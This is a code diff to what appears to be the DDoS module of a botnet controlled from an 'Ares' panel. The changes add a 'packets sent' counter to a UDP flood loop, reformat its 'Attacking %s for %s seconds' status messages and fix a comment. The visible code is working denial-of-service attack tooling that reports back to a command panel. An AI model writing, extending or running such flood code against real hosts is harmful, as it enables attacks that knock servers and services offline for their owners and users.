@@ -16,6 +16,8 @@
 
 # 1/10/2016  - 1:46 AM - Update: Refining Commands and including UDP Stress test option.
 
+# 1/10/2016 - 11:58 AM - Update: Included 'packets sent' feedback for UDP flood.
+
 
 # Panel Command Format:
 
@@ -177,11 +179,18 @@ def floodUDP():
             # Increment send count
             sent = sent + 1
 
+            # Live display every ten thousand packets. 
+            if sent % 10000 == 0:
+                # Panel feedback related to UDP packet delivery
+                utils.send_output("%s packets sent." % (sent))
+
             # Display info
             print "Attacking %s sent packages %s at the port %s " % (sent, server, vport)
 
         # if not active then break ..
         elif isDos == False:
+
+            # Exit Loop
             break
 
 
@@ -225,15 +234,15 @@ def run(action, dtype, num_req):
     elif action != "stop" and dtype == "UDP":
 
         utils.send_output("UDP-DDoS Started.")
-        utils.send_output("Attacking " + action + " for " + str(num_req) + " seconds.")
-        
+        utils.send_output("Attacking %s for %s seconds." % (action, str(num_req)))
+
         # Boolean value that determines if stresser is active
         isDos = True
 
         # Argument passed from Ares panel
         server = action # Host put in server     
 
-        secUDP = int(num_req) # Specified number of requests
+        secUDP = int(num_req) # Specified number of seconds
 
         # Call function to begin UDP Attack
         floodUDP()   
@@ -277,3 +286,5 @@ def help():
     """
     return help_text
 
+
+    
